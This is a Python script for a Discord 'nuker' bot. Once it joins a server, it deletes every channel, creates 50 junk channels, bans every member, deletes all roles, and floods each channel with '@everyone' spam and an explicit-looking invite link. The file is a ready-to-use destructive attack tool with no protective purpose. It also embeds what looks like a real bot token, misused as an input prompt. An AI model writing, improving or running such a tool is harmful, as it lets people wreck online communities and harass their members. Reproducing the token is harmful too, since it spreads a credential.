import discord
import asyncio
import random
import string
from discord.ext import commands

class OblivionNuker(commands.Bot):
    def __init__(self, token):
        super().__init__(command_prefix="!", intents=discord.Intents.all())
        self.token = token
        self.guild = None
        self.spam_content = "@everyone @here SERVER NUKED BY DNEZ\nhttps://discord.gg/pornhub"

    async def on_ready(self):
        print(f"[+] Logged in as {self.user}")
        self.guild = self.guilds[0]
        await self.nuke()

    async def nuke(self):
        for channel in self.guild.channels:
            try:
                await channel.delete()
                print(f"[-] Deleted channel: {channel.name}")
            except:
                pass

        for _ in range(50):
            try:
                name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                await self.guild.create_text_channel(name)
                print(f"[+] Created channel: {name}")
            except:
                pass

        for member in self.guild.members:
            try:
                await member.ban(reason="DNEZ ON TOP")
                print(f"[-] Banned: {member.name}")
            except:
                pass

        for role in self.guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    print(f"[-] Deleted role: {role.name}")
            except:
                pass

        for channel in self.guild.text_channels:
            try:
                for _ in range(20):
                    await channel.send(self.spam_content)
            except:
                pass

        print("[!] Down hahaha.")

if __name__ == "__main__":
    token = input("MTUwMzc3MDY5MTE2MDUxMDU5Nw.G6Kcvr.AX63wdVksPfMwvCQVPFrOm2z--579AmPRgqI8o")
    bot = OblivionNuker(token)
    bot.run(token)